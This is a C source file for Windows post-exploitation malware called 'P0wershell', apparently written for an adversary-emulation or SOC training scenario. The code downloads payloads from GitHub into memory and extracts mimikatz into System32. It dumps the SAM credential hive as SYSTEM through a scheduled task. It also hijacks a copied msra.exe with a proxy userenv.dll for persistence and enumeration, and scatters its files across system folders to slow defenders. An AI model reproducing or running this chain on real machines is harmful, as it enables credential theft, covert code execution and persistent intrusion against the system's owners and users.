#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <tlhelp32.h>
#include <urlmon.h>
#include <shlobj.h>
#include <wininet.h>
#include <wtsapi32.h>
#include "payload_extract.h"

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "wtsapi32.lib")

BOOL WINAPI IsUserAnAdmin(void);

/* ponytail: scattered paths across noise-friendly Microsoft dirs so no single
   dir holds the whole chain (SOC has to hunt in 6 places). mimikatz keeps its
   real filename in System32 as a deliberate hard IOC for the blue team. */
static const char *g_sys32    = "C:\\Windows\\System32";
static const char *g_msra_dir = "C:\\Users\\Public\\Libraries";
static const char *g_mimi_exe = "C:\\Windows\\System32\\mimikatz.exe";
static const char *g_mimi_sha = "C:\\ProgramData\\USOShared\\Logs\\mimikatz.sha256.txt";
static const char *g_dump     = "C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\sam.tmp";
static const char *g_bat      = "C:\\Windows\\Temp\\mimi.bat";
static const char *g_mimi_url = "https://github.com/Justanother-engineer/scenario4/raw/refs/heads/main/payload.zip";
static const char *g_mimi_pw  = "12@1";
static const char *g_tag      = "P0wershell.exe";

/* ponytail: single centralized activity log on the operator's Desktop. Every
   component appends timestamped [tag] lines; every technique logs [+] with a
   confirming detail (PID / bytes / hash / exit code) or [-]. */
static void activity(const char *fmt, ...) {
    char path[MAX_PATH];
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, path))) return;
    lstrcatA(path, "\\activity.log");
    FILE *f = fopen(path, "a");
    if (!f) return;
    SYSTEMTIME st; GetLocalTime(&st);
    fprintf(f, "[%04u-%02u-%02u %02u:%02u:%02u] [%s] ", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, g_tag);
    va_list ap; va_start(ap, fmt); vfprintf(f, fmt, ap); va_end(ap);
    fputc('\n', f);
    fclose(f);
}

static void press_exit(int code, const char* why) {
    char buf[256];
    snprintf(buf, sizeof(buf), "P0wershell exiting (%d)\n%s", code, why ? why : "");
    activity("[*] %s", buf);
    MessageBoxA(NULL, buf, "P0wershell", MB_OK | MB_ICONINFORMATION);
    exit(code);
}

/* ponytail: pull payload.zip straight into a heap buffer via WinINet — no
   file is ever written for the zip (no payload.zip IOC on disk, no zip
   write/delete trace). Only the extracted mimikatz.exe hits disk. */
static unsigned char *download_to_mem(const char *url, DWORD *outLen) {
    *outLen = 0;
    HINTERNET hNet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hNet) return NULL;
    HINTERNET hUrl = InternetOpenUrlA(hNet, url, NULL, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 0);
    if (!hUrl) { InternetCloseHandle(hNet); return NULL; }

    DWORD cap = 8 * 1024 * 1024, len = 0;
    unsigned char *buf = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, cap);
    if (!buf) { InternetCloseHandle(hUrl); InternetCloseHandle(hNet); return NULL; }
    DWORD rd;
    while (InternetReadFile(hUrl, buf + len, cap - len, &rd) && rd) {
        len += rd;
        if (len == cap) {
            cap *= 2;
            unsigned char *nb = (unsigned char *)HeapReAlloc(GetProcessHeap(), 0, buf, cap);
            if (!nb) { HeapFree(GetProcessHeap(), 0, buf); buf = NULL; break; }
            buf = nb;
        }
    }
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hNet);
    *outLen = len;
    return buf;
}

static void stage_payload(void) {
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(g_mimi_exe, &fd);
    if (h != INVALID_HANDLE_VALUE) { FindClose(h); activity("[+] Already present: %s", g_mimi_exe); return; }

    activity("[+] Fetching payload.zip IN-MEMORY (no disk write)");
    DWORD len = 0;
    unsigned char *zip = download_to_mem(g_mimi_url, &len);
    if (!zip || !len) {
        activity("[-] payload.zip in-memory fetch failed");
        if (zip) HeapFree(GetProcessHeap(), 0, zip);
        return;
    }
    activity("[+] payload.zip fetched in-memory (%lu bytes)", len);

    if (!extract_payload_mem(zip, len, g_mimi_exe, g_mimi_pw)) {
        activity("[-] Payload staging failed: %s", g_mimi_exe);
    } else {
        activity("[+] Payload staged: %s (mimikatz, real filename = hard IOC)", g_mimi_exe);
        /* hard signature: SHA-256 manifest via certutil -> USOShared\Logs */
        char c[MAX_PATH * 4];
        wsprintfA(c, "cmd /c certutil -hashfile \"%s\" SHA256 > \"%s\" 2>&1", g_mimi_exe, g_mimi_sha);
        if (system(c) == 0) activity("[+] SHA256 manifest written -> %s", g_mimi_sha);
        else activity("[-] SHA256 manifest (certutil) failed");
    }
    HeapFree(GetProcessHeap(), 0, zip);
}

/* ponytail: lsadump::sam needs SeBackupPrivilege to read HKLM\SAM. Under a
   UAC-filtered admin token that privilege is STRIPPED (not just disabled),
   so `privilege::backup` can't enable it -> 0x5 ACCESS_DENIED, empty dump.
   Run mimikatz as SYSTEM via a one-shot scheduled task: SYSTEM owns the SAM
   hive and already holds SeBackup/SeTcb, and /ru SYSTEM schtasks needs no
   extra password. */
static void launch_mimikatz(void) {
    DeleteFileA(g_dump);

    /* tiny wrapper batch: schtasks /tr doesn't honour shell redirection, so
       the batch captures mimikatz stdout/stderr to the dump file. */
    FILE *bf = fopen(g_bat, "w");
    if (!bf) { activity("[-] Cannot write %s", g_bat); return; }
    fprintf(bf, "@\"%s\" \"lsadump::sam\" \"exit\" > \"%s\" 2>&1\r\n", g_mimi_exe, g_dump);
    fclose(bf);
    activity("[+] Wrapper batch written: %s", g_bat);

    char c[MAX_PATH * 4];
    wsprintfA(c, "schtasks.exe /create /tn MimiDump /tr \"%s\" /ru SYSTEM /sc once /st 00:00 /f >nul 2>&1", g_bat);
    if (system(c) != 0) {
        activity("[-] schtasks /create MimiDump failed");
        DeleteFileA(g_bat);
        return;
    }
    activity("[+] MimiDump task created (ru=SYSTEM)");

    wsprintfA(c, "schtasks.exe /run /tn MimiDump >nul 2>&1");
    if (system(c) != 0) {
        activity("[-] schtasks /run MimiDump failed");
        wsprintfA(c, "schtasks.exe /delete /tn MimiDump /f >nul 2>&1");
        system(c);
        DeleteFileA(g_bat);
        return;
    }
    activity("[+] mimikatz.exe (lsadump::sam) launched as SYSTEM via schtasks -> %s", g_dump);

    /* poll up to 60s for a non-empty dump; confirms the technique worked */
    WIN32_FILE_ATTRIBUTE_DATA fa;
    DWORD sz = 0;
    for (int i = 0; i < 120; i++) {
        Sleep(500);
        if (GetFileAttributesExA(g_dump, GetFileExInfoStandard, &fa) && fa.nFileSizeLow > 0) {
            Sleep(2000);
            GetFileAttributesExA(g_dump, GetFileExInfoStandard, &fa);
            sz = fa.nFileSizeLow;
            break;
        }
    }
    if (sz) activity("[+] SAM dump CONFIRMED (%lu bytes) -> %s", sz, g_dump);
    else    activity("[-] SAM dump empty (0 bytes) -> %s", g_dump);

    wsprintfA(c, "schtasks.exe /delete /tn MimiDump /f >nul 2>&1");
    system(c);
    DeleteFileA(g_bat);
    activity("[*] MimiDump task + batch cleaned up");
}

int main(void) {
    activity("[+] P0wershell started");
    g_audit_fn = activity;

    if (!IsUserAnAdmin()) {
        printf("[-] Not running as admin.\n");
        press_exit(1, "[-] Not running as admin.");
    }

    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    printf("[+] Path: %s\n", path);
    if (lstrcmpiA(path, "C:\\Windows\\System32\\P0wershell.exe") != 0)
        printf("[*] Warning: not running from System32, post-exploitation will proceed anyway\n");

    printf("[+] Running in Elevated Session.\n");
    activity("[+] Elevation: IsUserAnAdmin=TRUE (UAC-full token)");

    DWORD parentPID = 0;
    DWORD myPID = GetCurrentProcessId();
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = { .dwSize = sizeof(PROCESSENTRY32) };
        if (Process32First(snap, &pe)) {
            do {
                if (pe.th32ProcessID == myPID) {
                    parentPID = pe.th32ParentProcessID;
                    break;
                }
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }

    const char* parentName = "unknown";
    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = { .dwSize = sizeof(PROCESSENTRY32) };
        if (Process32First(snap, &pe)) {
            do {
                if (pe.th32ProcessID == parentPID) {
                    parentName = pe.szExeFile;
                    break;
                }
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }
    printf("[+] Parent PID: %lu (%s)\n", parentPID, parentName);
    activity("[+] Module path: %s | Parent PID: %lu (%s)", path, parentPID, parentName);

    char targetMsra[MAX_PATH], targetUserenv[MAX_PATH], targetMimilib[MAX_PATH];
    wsprintfA(targetMsra, "%s\\msra.exe", g_msra_dir);
    wsprintfA(targetUserenv, "%s\\userenv.dll", g_msra_dir);
    wsprintfA(targetMimilib, "%s\\mimilib.dll", g_sys32);

    /* ensure the scatter dirs exist (System32 already does) */
    const char *dirs[] = {
        g_msra_dir,
        "C:\\ProgramData\\USOShared\\Logs",
        "C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue",
        "C:\\ProgramData\\Microsoft\\Search\\Data\\EDS"
    };
    for (int i = 0; i < (int)(sizeof(dirs) / sizeof(dirs[0])); i++) {
        int hr = SHCreateDirectoryExA(NULL, dirs[i], NULL);
        if (hr != ERROR_SUCCESS && hr != ERROR_ALREADY_EXISTS) {
            printf("[-] Failed to create dir %s (0x%lx)\n", dirs[i], hr);
            press_exit(1, "[-] Failed to create target directory.");
        }
    }
    activity("[+] Scatter dirs ready: Libraries, USOShared\\Logs, WER\\ReportQueue, Search\\Data\\EDS");

    if (!CopyFileA("C:\\Windows\\System32\\msra.exe", targetMsra, FALSE)) {
        printf("[-] Failed to copy msra.exe (%lu)\n", GetLastError());
        press_exit(1, "[-] Failed to copy msra.exe.");
    }
    activity("[+] msra.exe copied -> %s", targetMsra);

    HKEY hKey;
    LONG regRet = RegCreateKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msra.exe",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    if (regRet != ERROR_SUCCESS) {
        printf("[-] Failed to open registry key (%ld)\n", regRet);
        press_exit(1, "[-] Failed to set registry key.");
    }
    RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)targetMsra, lstrlenA(targetMsra) + 1);
    RegCloseKey(hKey);
    activity("[+] Reg: App Paths\\msra.exe = %s", targetMsra);

    const char *dllBaseUrl = "https://github.com/Justanother-engineer/scenario4/raw/refs/heads/main";
    char dllUrl[MAX_PATH];
    wsprintfA(dllUrl, "%s/userenv.dll", dllBaseUrl);
    printf("[+] Downloading userenv.dll...\n");
    HRESULT hr = URLDownloadToFileA(NULL, dllUrl, targetUserenv, 0, NULL);
    if (hr != S_OK)
        printf("[-] userenv.dll download failed (0x%lx) — place it manually\n", hr);
    else
        printf("[+] userenv.dll downloaded\n");
    {
        WIN32_FILE_ATTRIBUTE_DATA fa;
        DWORD sz = 0;
        if (GetFileAttributesExA(targetUserenv, GetFileExInfoStandard, &fa)) sz = fa.nFileSizeLow;
        activity("[+] userenv.dll staged (%lu bytes) -> %s", sz, targetUserenv);
    }

    /* ponytail: load the proxy DLL inside this long-lived elevated process so
       its worker thread (persistence + enumeration) runs to completion. */
    if (LoadLibraryA(targetUserenv))
        activity("[+] userenv.dll loaded (persistence + enumeration worker started)");
    else
        activity("[-] LoadLibrary userenv.dll failed (%lu)", GetLastError());

    stage_payload();
    launch_mimikatz();

    printf("[+] Downloading mimilib.dll...\n");
    hr = URLDownloadToFileA(NULL,
        "https://raw.githubusercontent.com/ParrotSec/mimikatz/master/x64/mimilib.dll",
        targetMimilib, 0, NULL);
    if (hr != S_OK)
        printf("[-] mimilib.dll download failed (0x%lx) — place it manually\n", hr);
    else
        printf("[+] mimilib.dll downloaded\n");
    {
        WIN32_FILE_ATTRIBUTE_DATA fa;
        DWORD sz = 0;
        if (GetFileAttributesExA(targetMimilib, GetFileExInfoStandard, &fa)) sz = fa.nFileSizeLow;
        activity("[+] mimilib.dll staged (%lu bytes) -> %s", sz, targetMimilib);
    }

    /* ponytail: 740 = ERROR_ELEVATION_REQUIRED; msra.exe has a requireAdministrator
       manifest, so plain CreateProcess fails. ShellExecuteEx "runas" satisfies it
       (no prompt when caller is already elevated). */
    SHELLEXECUTEINFOA sei = { .cbSize = sizeof(sei) };
    sei.lpFile = targetMsra;
    sei.nShow = SW_SHOW;
    sei.lpVerb = "runas";
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    if (ShellExecuteExA(&sei) && sei.hProcess) {
        printf("[+] msra.exe launched (PID: %lu)\n", GetProcessId(sei.hProcess));
        activity("[+] msra.exe launched (PID: %lu)", GetProcessId(sei.hProcess));
        CloseHandle(sei.hProcess);
    } else {
        printf("[-] Failed to launch msra.exe (0x%lx)\n", (DWORD)(DWORD_PTR)sei.hInstApp);
        activity("[-] Failed to launch msra.exe (0x%lx)", (DWORD)(DWORD_PTR)sei.hInstApp);
    }

    /* ponytail: hold the process ~60s so the userenv.dll worker thread finishes
       (tasks + enumeration); elevcheck now spawns us with CREATE_NO_WINDOW so
       there is no console to read 'q' from. */
    activity("[*] CHAIN COMPLETE: P0wershell stages finished (see per-step confirmations above)");
    printf("Chain complete; holding 60s for worker thread.\n");
    activity("[+] Holding P0wershell 60s for userenv.dll worker thread (tasks + enumeration) to finish");
    Sleep(60000);
    press_exit(0, "[+] P0wershell completed.");
}
